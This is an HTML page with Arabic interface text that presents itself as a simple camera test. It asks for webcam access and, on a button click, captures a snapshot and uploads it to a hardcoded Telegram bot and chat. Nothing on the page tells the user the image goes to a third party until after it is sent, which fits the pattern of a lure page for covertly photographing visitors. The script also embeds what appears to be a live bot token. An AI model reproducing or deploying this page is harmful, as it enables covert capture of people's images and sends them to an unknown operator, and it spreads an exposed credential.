<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Camera Capture</title>
<style>
body { font-family: Arial; text-align: center; background:#111; color:#fff }
video { width: 90%; max-width: 400px; border:2px solid #0f0 }
button { padding:10px 20px; font-size:18px; margin-top:10px }
</style>
</head>

<body>

<h2>اختبار الكاميرا</h2>

<video id="video" autoplay playsinline></video><br>
<button onclick="takePhoto()">📸 التقاط صورة</button>

<canvas id="canvas" style="display:none;"></canvas>

<script>
// ===== ضع معلوماتك هنا (محليًا فقط) =====
const BOT_TOKEN = "7935190508:AAHJ4goT_kEPXv52CgU8mFz-aNqqlkdpqiA";
const CHAT_ID  = "7710816011";
// ======================================

// تشغيل الكاميرا (بموافقة المستخدم)
navigator.mediaDevices.getUserMedia({ video: true })
.then(stream => {
  document.getElementById("video").srcObject = stream;
})
.catch(err => {
  alert("تم رفض تشغيل الكاميرا");
});

// التقاط الصورة وإرسالها
function takePhoto() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  canvas.toBlob(blob => {
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", blob);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    })
    .then(() => alert("تم إرسال الصورة ✅"))
    .catch(() => alert("فشل الإرسال ❌"));
  }, "image/jpeg");
}
</script>

</body>
</html>
